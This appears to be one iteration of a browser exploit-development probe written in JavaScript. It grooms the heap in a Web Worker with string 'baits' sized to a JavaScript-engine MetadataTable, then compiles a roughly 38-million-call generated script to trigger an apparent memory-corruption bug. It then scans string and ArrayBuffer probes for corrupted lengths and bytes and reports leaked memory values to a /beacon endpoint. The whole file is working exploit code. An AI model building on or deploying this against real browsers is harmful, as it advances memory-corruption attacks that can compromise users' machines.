// p392 - COMBINED string + AB probe at MetadataTable size
//
// V378 confirmed StringImpl::m_length corruption for 100K strings.
// V391 showed ArrayBuffer data 100% intact for same-size ABs.
//
// V392 tests BOTH in one run:
// - 20 string baits (100092 chars = 100112 byte StringImpl)
// - 5 string probes (same size) -> check .length after sweep
// - 5 AB probes (100112 bytes, filled 0x42) -> check data after sweep
// - Also: thorough scan of corrupted string character data
//
// Beacon prefix: V392-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V392-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V392-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }

  B('BOOT');

  var workerCode = function() {
    var baits = [];
    var strProbes = [];
    var abProbes = [];
    var abViews = [];
    var baseUrl = '';
    // 100092 chars -> StringImpl header(20) + data(100092) = 100112 bytes
    var STR_LEN = 100092;
    var AB_SIZE = 100112;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V392-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    function makeStr(len, ch) {
      var s = '';
      for (var i = 0; i < 100; i++) s += ch;
      var reps = Math.ceil(len / 100);
      var result = '';
      for (var i = 0; i < reps; i++) result += s;
      result = result.substring(0, len);
      result.charCodeAt(0); // force resolve
      return result;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') { baseUrl = e.data.baseUrl; beacon('ALIVE'); return; }

      if (e.data.cmd === 'alloc') {
        // 20 STRING baits (same underlying alloc size as MetadataTable)
        for (var i = 0; i < 20; i++) baits.push(makeStr(STR_LEN, 'A'));
        beacon('SBAITS-' + baits.length);

        // 5 STRING probes
        for (var i = 0; i < 5; i++) strProbes.push(makeStr(STR_LEN, 'A'));
        beacon('SPROBES-' + strProbes.length);

        // 5 AB probes
        for (var i = 0; i < 5; i++) {
          var ab = new ArrayBuffer(AB_SIZE);
          var v = new Uint8Array(ab);
          for (var j = 0; j < AB_SIZE; j++) v[j] = 0x42;
          abProbes.push(ab);
          abViews.push(v);
        }
        beacon('ABPROBES-' + abProbes.length);

        // Free string baits
        for (var i = 0; i < baits.length; i++) baits[i] = null;
        baits = [];
        beacon('FREED');
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');

        // === STRING PROBES ===
        var strCorrupt = 0;
        var strIntact = 0;
        for (var pi = 0; pi < strProbes.length; pi++) {
          try {
            var s = strProbes[pi];
            var len = s.length;
            if (len === STR_LEN) {
              strIntact++;
              beacon('S' + pi + '-INTACT-' + len);
            } else {
              strCorrupt++;
              beacon('S' + pi + '-CORRUPT-' + len);

              // THOROUGH character scan: check for non-'A' in truncated range
              var nonA = [];
              var scanLim = Math.min(len, 80000);
              for (var j = 0; j < scanLim; j++) {
                var c = s.charCodeAt(j);
                if (c !== 0x41) {
                  nonA.push(j);
                  if (nonA.length <= 20) {
                    beacon('S' + pi + '-NONA-' + j + '-' + hexByte(c & 0xFF));
                  }
                }
              }
              beacon('S' + pi + '-CHARSCAN-' + scanLim + '-NONA-' + nonA.length);

              // If non-A found, read 8 bytes at first positions
              if (nonA.length > 0) {
                for (var k = 0; k < Math.min(nonA.length, 5); k++) {
                  var pos = nonA[k];
                  var hex8 = '';
                  for (var b = 0; b < 8 && (pos + b) < len; b++) {
                    hex8 += hexByte(s.charCodeAt(pos + b) & 0xFF);
                  }
                  beacon('S' + pi + '-CBYTES-' + pos + '-' + hex8);
                }
                // Check stride diffs
                if (nonA.length >= 2) {
                  var diffs = [];
                  for (var k = 1; k < Math.min(nonA.length, 10); k++) {
                    diffs.push(nonA[k] - nonA[k-1]);
                  }
                  beacon('S' + pi + '-CDIFFS-' + diffs.join(','));
                }
              }
            }
          } catch(ex) {
            beacon('S' + pi + '-CRASH-' + (ex.message || '').substring(0, 30));
          }
        }

        // === AB PROBES ===
        var abCorrupt = 0;
        var abIntact = 0;
        for (var pi = 0; pi < abProbes.length; pi++) {
          try {
            var v = abViews[pi];
            var nonB = 0;
            for (var j = 0; j < AB_SIZE; j++) {
              if (v[j] !== 0x42) {
                nonB++;
                if (nonB <= 10) {
                  beacon('A' + pi + '-NONB-' + j + '-' + hexByte(v[j]));
                }
              }
            }
            if (nonB === 0) {
              abIntact++;
              beacon('A' + pi + '-INTACT');
            } else {
              abCorrupt++;
              beacon('A' + pi + '-HIT-' + nonB);
            }
          } catch(ex) {
            beacon('A' + pi + '-CRASH-' + (ex.message || '').substring(0, 30));
          }
        }

        beacon('SUMMARY-SC' + strCorrupt + '-SI' + strIntact + '-AC' + abCorrupt + '-AI' + abIntact);
        beacon('ALL-DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(['(' + workerCode.toString() + ')()'], { type: 'application/javascript' });
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: location.protocol + '//' + location.host });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      var gcR = 0;
      function gc() {
        for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
        for (var j = 0; j < 500; j++) new Array(100).fill(gcR);
        gcR++;
        if (gcR < 30) setTimeout(gc, 30);
        else { B('GC-' + gcR); build(); }
      }
      gc();
    }
    if (e.data.done) {
      B('WORKER-SCAN-DONE');
    }
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p392fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p392ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p392ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
